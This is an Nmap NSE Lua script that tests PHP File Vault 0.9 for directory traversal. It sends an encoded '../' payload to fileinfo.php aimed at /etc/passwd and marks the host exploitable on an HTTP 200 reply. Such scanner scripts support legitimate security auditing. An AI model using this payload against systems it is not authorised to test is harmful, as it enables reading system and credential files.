description = [[
Exploits a directory traversal vulnerability in PHP File Vault 0.9

Reference:
* https://www.exploit-db.com/exploits/40163/
]]

---
-- @usage
-- nmap -p80 --script http-phpfilevault09-dir-traversal  <host/ip>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-phpfilevault09-dir-traversal:
-- |   VULNERABLE:
-- |   PHP remote directory traversal vulnerability and read file vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     Description:
-- |       PHP directory traversal vulnerability in fileinfo.php?sha1=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

author = "jc"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local http = require "http"
local vulns = require "vulns"

portrule = shortport.http


action = function(host, port)

    local uri = "/htdocs/fileinfo.php?sha1=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    local vuln= {
        title = "PHP remote directory traversal vulnerability and read file vulnerability",
        state = vulns.STATE.EXPLOIT,
        risk_factor = "High",
        description = [[ A very small PHP website application which stores anonymously uploaded files and retrieves them by SHA1 hash (a fingerprint of the file which is provided after uploading). Developed for anonysource.org , a kanux project.
	]]
    }
    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

    local response = http.get(host, port, uri)
    if ( response.status == 200 ) then
        vuln.state = vulns.STATE.EXPLOIT
        return vuln_report:make_output(vuln)
    elseif (response.status == 403 )  then
        vuln.state = vulns.STATE.NOT_VUL
        return vuln_report:make_output(vuln)
    else
        return response.status
    end
end

